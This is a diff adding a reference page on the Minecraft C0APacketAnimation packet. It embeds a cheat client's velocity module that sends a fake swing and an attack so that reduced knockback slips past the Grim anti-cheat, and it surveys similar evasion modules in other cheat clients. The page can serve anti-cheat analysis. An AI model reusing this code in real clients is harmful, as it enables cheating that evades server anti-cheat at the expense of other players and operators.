+import com.alan.clients.event.Listener;
+import com.alan.clients.event.Priorities;
+import com.alan.clients.event.annotations.EventLink;
+import com.alan.clients.event.impl.motion.PreUpdateEvent;
+import com.alan.clients.module.impl.combat.Velocity;
+import com.alan.clients.util.packet.PacketUtil;
+import com.alan.clients.value.Mode;
+import net.minecraft.entity.EntityLivingBase;
+import net.minecraft.network.play.client.C0APacketAnimation;
+
+import java.util.List;
+
+public final class GrimReduceVelocity extends Mode&lt;Velocity&gt; {
+
+    public GrimReduceVelocity(String name, Velocity parent) {
+        super(name, parent);
+    }
+
+    @EventLink(value = Priorities.VERY_LOW)
+    public final Listener&lt;PreUpdateEvent&gt; onPreUpdate = event -&gt; {
+        if (getParent().onSwing.getValue() &amp;&amp; !mc.thePlayer.isSwingInProgress ||
+                mc.thePlayer.ticksExisted &lt;= 20) return;
+
+        List&lt;EntityLivingBase&gt; targets = TargetComponent.getTargets(7);
+
+        if (targets.isEmpty()) return;
+
+        if (mc.thePlayer.ticksSinceVelocity &lt;= 14 &amp;&amp; !BadPacketsComponent.bad()) {
+            PacketUtil.send(new C0APacketAnimation());
+            mc.playerController.attackEntity(mc.thePlayer, targets.get(0));
+        }
+    };
+}
+// NOTE (AI): The C0A send is gated on the bad-packet flag, showing how the swing state bit is consumed. AACVelocity, WatchdogPredictionVelocity and WatchdogLongJump import C0A for the same family; BlockFlight and UnKnownAC send it during flight, AntiFireBall and Clutch send it before their own actions.</code></div><button class="code-expand-btn" onclick="var w=this.parentNode;w.classList.toggle('collapsed');w.classList.toggle('expanded');this.querySelector('.expand-label').textContent=w.classList.contains('collapsed')?'Show more':'Show less'"><svg class="expand-icon-collapsed" width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="6 9 12 15 18 9"/></svg><svg class="expand-icon-expanded" width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="18 15 12 9 6 15"/></svg><span class="expand-label">Show more</span></button></div>
+<div class="impl-meta"><span><strong>Vanilla hook:</strong> PreUpdateEvent.</span></div>
+<div class="impl-meta" style="color:var(--orange);margin-top:4px"><span>The swing makes the velocity attack read as a normal hit; the real flag surface is the velocity reduction itself, not the swing.</span></div>
+<div class="impl-meta" style="margin-top:4px"><span><strong>Variations:</strong> The same swing-before-action pattern appears across the Rise 6.x velocity and flight tree: AACVelocity, WatchdogPredictionVelocity, WatchdogLongJump, BlockFlight, UnKnownAC, AntiFireBall, Clutch. Rise 6.1.30's AntiFireBall uses PacketUtil.sendNoEvent instead of send.</span></div>
+</div>
+<div class="impl-meta" style="margin-top:8px;white-space:pre-wrap">PacketSendEvent is the filter surface: Rise 5.99 AutoGap checks instanceof C0APacketAnimation to time eating, Freecam/FreeCam whitelist C0A in packet passthrough lists, and Spicy CsgoSpinbot and YawAndPitchSpoof match it in packet events. Tenacity PacketUtil counts C0A among packet types exempt from its send queue.</div>
+<div class="impl-clients">Older clients (Memeware, Nekoware, Sigma, Spicy, Tenacity) push via mc.thePlayer.sendQueue.addToSendQueue; Rise 5.99 uses PacketUtil.sendPacket; Rise 6.x uses PacketUtil.send and sendNoEvent. The Rise 6.1.30 AntiFireBall uses sendNoEvent where 6.2.4 uses send.</div>
+</div>
+<div class="detail-section"><h3>Related Packets</h3><div class="related-list">
+<a class="related-chip" href="../S0BPacketAnimation/">S0BPacketAnimation</a>
+<a class="related-chip" href="../C02PacketUseEntity/">C02PacketUseEntity</a>
+<a class="related-chip" href="../C08PacketPlayerBlockPlacement/">C08PacketPlayerBlockPlacement</a>
+</div></div>
     </div>
     <div style="margin-top:32px;text-align:center">
       <a href="../../" style="color:var(--accent);font-size:0.85rem">← Back to all packets</a>
